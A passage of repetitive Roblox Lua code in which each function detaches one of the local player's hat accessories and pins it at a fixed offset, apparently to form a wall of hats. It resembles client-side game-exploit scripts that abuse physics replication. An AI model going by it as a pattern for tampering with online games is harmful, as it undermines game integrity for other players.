		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_10()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b10"
local HAT = "b10"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 4
Zval.Value = -8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_11()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b11"
local HAT = "b11"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 8
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_12()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b12"
local HAT = "b12"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 8
Zval.Value = 4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_13()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b13"
local HAT = "b13"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 8
Zval.Value = -4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_14()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b14"
local HAT = "b14"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 8
Zval.Value = 8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_15()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b15"
local HAT = "b15"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 8
Zval.Value = -8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end


local function wall4_2()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c2"
local HAT = "c2"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 0
Zval.Value = 4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_3()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c3"
local HAT = "c3"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 0
Zval.Value = -4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_4()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c4"
local HAT = "c4"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 0
Zval.Value = 8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_5()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c5"
local HAT = "c5"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 0
Zval.Value = -8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_7()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c7"
local HAT = "c7"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 4
Zval.Value = 4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_8()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c8"
local HAT = "c8"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 4
Zval.Value = -4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_9()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c9"
local HAT = "c9"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 4
Zval.Value = 8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_10()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c10"
local HAT = "c10"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 4
Zval.Value = -8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
